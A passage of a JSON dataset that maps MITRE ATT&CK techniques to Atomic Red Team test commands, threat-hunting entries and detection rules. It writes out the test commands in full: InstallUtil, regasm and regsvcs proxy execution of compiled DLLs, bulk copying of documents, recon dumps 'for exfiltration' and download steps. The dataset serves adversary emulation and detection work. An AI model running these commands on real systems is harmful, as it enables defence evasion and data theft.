/U %tmp%\\T1118.dll\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{output_file} PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? #{output_file}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:%tmp%\\T1118.dll PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? %tmp%\\T1118.dll\n", "name": null}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{output_file}  PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{output_file}\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:%tmp%\\T1118.dll  PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U %tmp%\\T1118.dll\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{output_file} PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? #{output_file}\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:%tmp%\\T1118.dll PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? %tmp%\\T1118.dll\n"], "technique_id": "T1118", "parsed_datasets": [{"Atomic Red Team Test - InstallUtil": {"display_name": "InstallUtil", "atomic_tests": [{"dependencies": [{"description": "Source code must exist on disk at specified location (#{source})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{source}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/T1118.cs\" -OutFile \"#{source}\"\n", "prereq_command": "if (Test-Path #{source}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "InstallUtil uninstall method call", "executor": {"elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{output_file}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{output_file}\n", "name": "command_prompt", "cleanup_command": "del #{output_file} >nul 2>&1\n"}, "description": "Executes the Uninstall Method\n", "input_arguments": {"source": {"default": "PathToAtomicsFolder\\T1118\\src\\T1118.cs", "type": "Path", "description": "location of the source code to compile"}, "output_file": {"default": "%tmp%\\T1118.dll", "type": "Path", "description": "location of the payload"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Source code must exist on disk at specified location (#{source})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{source}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/T1118.cs\" -OutFile \"#{source}\"\n", "prereq_command": "if (Test-Path #{source}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "InstallUtil GetHelp method call", "executor": {"elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{output_file} #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? #{output_file}\n", "name": "command_prompt", "cleanup_command": "del #{output_file} >nul 2>&1\n"}, "description": "Executes the Uninstall Method\n", "input_arguments": {"source": {"default": "PathToAtomicsFolder\\T1118\\src\\T1118.cs", "type": "Path", "description": "location of the source code to compile"}, "output_file": {"default": "%tmp%\\T1118.dll", "type": "Path", "description": "location of the payload"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1118"}}], "queries": [{"query": "Sysmon| where EventID == 3 and (process_path contains \"InstallUtil.exe\"or process_command_line contains \"\\\\/logfile= \\\\/LogToConsole=false \\\\/U\")", "product": "Azure Sentinel", "name": "InstallUtil"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1119/T1119.yaml", "command": "dir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f c:\\temp\\\n", "name": null}, {"source": "atomics/T1119/T1119.yaml", "command": "Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\\temp}\n", "name": null}, {"source": "atomics/T1119/T1119.yaml", "command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "name": null}, {"source": "atomics/T1119/T1119.yaml", "command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "name": null}, {"source": "Threat Hunting Tables", "command": "cmd.exe dir c: /b /s .docx | findstr /e .docx", "name": null}], "command_list": ["dir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f c:\\temp\\\n", "Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\\temp}\n", "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "cmd.exe dir c: /b /s .docx | findstr /e .docx"], "technique_id": "T1119", "parsed_datasets": [{"Atomic Red Team Test - Automated Collection": {"display_name": "Automated Collection", "atomic_tests": [{"description": "Automated Collection\n", "supported_platforms": ["windows"], "name": "Automated Collection Command Prompt", "executor": {"command": "dir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f c:\\temp\\\n", "name": "command_prompt"}}, {"description": "Automated Collection\n", "supported_platforms": ["windows"], "name": "Automated Collection PowerShell", "executor": {"elevation_required": false, "command": "Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\\temp}\n", "name": "powershell"}}, {"description": "collect information for exfiltration\n", "supported_platforms": ["windows"], "name": "Recon information for export with PowerShell", "executor": {"elevation_required": false, "command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "name": "powershell", "cleanup_command": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore\n"}}, {"description": "collect information for exfiltration\n", "supported_platforms": ["windows"], "name": "Recon information for export with Command Prompt", "executor": {"elevation_required": false, "command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "name": "command_prompt", "cleanup_command": "del %TEMP%\\T1119_1.txt >nul 2>&1\ndel %TEMP%\\T1119_2.txt >nul 2>&1\ndel %TEMP%\\T1119_3.txt >nul 2>&1\ndel %TEMP%\\T1119_4.txt >nul 2>&1"}}], "attack_technique": "T1119"}}, {"Threat Hunting Tables": {"mitre_attack": "T1119", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100127", "registry_value": "", "mitre_caption": "data_collection", "registry_path": "", "frequency": "low", "commandline_string": "dir c: /b /s .docx | findstr /e .docx", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1121/T1121.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1121.dll\n", "name": null}, {"source": "atomics/T1121/T1121.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1121.dll\n", "name": null}, {"source": "atomics/T1121/T1121.yaml", "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1121.dll\n", "name": null}, {"source": "atomics/T1121/T1121.yaml", "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:$env:Temp\\key.snk PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1121.dll\n", "name": null}, {"source": "Threat Hunting Tables", "command": "regsvcs.exe *.dll", "name": null}, {"source": "Threat Hunting Tables", "command": "regasm.exe *.dll", "name": null}, {"source": "Threat Hunting Tables", "command": "rundll32.exe *.dll.entrypoint", "name": null}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1121.dll\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1121.dll\n", "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1121.dll\n", "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:$env:Temp\\key.snk PathToAtomicsFolder\\T1121\\src\\T1121.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1121.dll\n", "regsvcs.exe *.dll", "regasm.exe *.dll", "rundll32.exe *.dll.entrypoint"], "technique_id": "T1121", "parsed_datasets": [{"Atomic Red Team Test - RegSvcs/RegAsm": {"display_name": "RegSvcs/RegAsm", "atomic_tests": [{"dependencies": [{"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs\" -OutFile \"#{source_file}\"\n", "prereq_command": "if (Test-Path #{source_file}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Regasm Uninstall Method Call Test", "executor": {"elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n", "name": "command_prompt", "cleanup_command": "del #{output_file} >nul 2>&1\n"}, "description": "Executes the Uninstall Method, No Admin Rights Required\n", "input_arguments": {"output_file": {"default": "%tmp%\\T1121.dll", "type": "Path", "description": "Location of the payload"}, "source_file": {"default": "PathToAtomicsFolder\\T1121\\src\\T1121.cs", "type": "Path", "description": "Location of the CSharp source_file"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs\" -OutFile \"#{source_file}\"\n", "prereq_command": "if (Test-Path #{source_file}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Regsvs Uninstall Method Call Test", "executor": {"elevation_required": false, "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "name": "powershell", "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore | Out-Null\nRemove-Item $env:Temp\\key.snk -ErrorAction Ignore | Out-Null\n"}, "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK\n", "input_arguments": {"output_file": {"default": "$Env:TEMP\\T1121.dll", "type": "Path", "description": "Location of the payload"}, "source_file": {"default": "PathToAtomicsFolder\\T1121\\src\\T1121.cs", "type": "Path", "description": "Location of the CSharp source_file"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1121"}}, {"Threat Hunting Tables": {"mitre_attack": "T1121", "file_value": "", "file_path": "", "parent_process": "regsvcs.exe", "itw_sample": "", "chain_id": "100168", "registry_value": "", "mitre_caption": "execution", "registry_path": "", "frequency": "high", "commandline_string": "*.dll", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1121", "file_value": "", "file_path": "", "parent_process": "regasm.exe", "itw_sample": "", "chain_id": "100169", "registry_value": "", "mitre_caption": "execution", "registry_path": "", "frequency": "high", "commandline_string": "*.dll", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1121", "file_value": "", "file_path": "", "parent_process": "rundll32.exe", "itw_sample": "", "chain_id": "100170", "registry_value": "", "mitre_caption": "execution", "registry_path": "", "frequency": "low", "commandline_string": "*.dll.entrypoint", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}], "queries": [{"query": "Sysmon| where EventID == 3and (process_path contains \"regsvcs.exe\"or process_path contains \"regasm.exe\")", "product": "Azure Sentinel", "name": "Regsvcs Regasm"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1123/T1123.yaml", "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/osx_mic_record", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/osx_mic_record", "name": "Empire Module Command"}], "command_list": ["powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n", "python/collection/osx/osx_mic_record", "python/collection/osx/osx_mic_record"], "technique_id": "T1123", "parsed_datasets": [{"Atomic Red Team Test - Audio Capture": {"display_name": "Audio Capture", "atomic_tests": [{"description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n", "supported_platforms": ["windows"], "name": "using device audio capture commandlet", "executor": {"elevation_required": false, "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n", "name": "powershell"}}], "attack_technique": "T1123"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1123", "Empire Module": "python/collection/osx/osx_mic_record", "Technique": "Audio Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/osx_mic_record\":  [\"T1123\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"SoundRecorder.exe\"or process_command_line contains \"*Get-AudioDevice*\"or process_command_line contains \"*WindowsAudioDevice-Powershell-Cmdlet*\")", "product": "Azure Sentinel", "name": "Audio Capture"}, {"query": "title: Audio Capture via PowerShell\nid: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6\ndescription: Detects audio capture via PowerShell Cmdlet\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html\ntags:\n    - attack.collection\n    - attack.t1123\ndetection:\n    selection:\n        CommandLine|contains: 'WindowsAudioDevice-Powershell-Cmdlet'\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Audio Capture via PowerShell\nid: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6\ndescription: Detects audio capture via PowerShell Cmdlet\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html\ntags:\n    - attack.collection\n    - attack.t1123\ndetection:\n    selection:\n        CommandLine|contains: 'WindowsAudioDevice-Powershell-Cmdlet'\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*WindowsAudioDevice\\\\-Powershell\\\\-Cmdlet*", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Audio-Capture-via-PowerShell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Audio Capture via PowerShell\",\\n    \"description\": \"Detects audio capture via PowerShell Cmdlet\",\\n    \"tags\": [\\n      \"attack.collection\",\\n      \"attack.t1123\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*WindowsAudioDevice\\\\\\\\-Powershell\\\\\\\\-Cmdlet*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*WindowsAudioDevice\\\\\\\\-Powershell\\\\\\\\-Cmdlet*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Audio Capture via PowerShell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:*WindowsAudioDevice\\\\-Powershell\\\\-Cmdlet*", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"*WindowsAudioDevice-Powershell-Cmdlet*\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*WindowsAudioDevice-Powershell-Cmdlet*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*WindowsAudioDevice-Powershell-Cmdlet.*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Audio Capture via SoundRecorder\nid: 83865853-59aa-449e-9600-74b9d89a6d6e\ndescription: Detect attacker collecting audio via SoundRecorder application\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html\ntags:\n    - attack.collection\n    - attack.t1123\ndetection:\n    selection:\n        Image|endswith: '\\SoundRecorder.exe'\n        CommandLine|contains: '/FILE'\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate 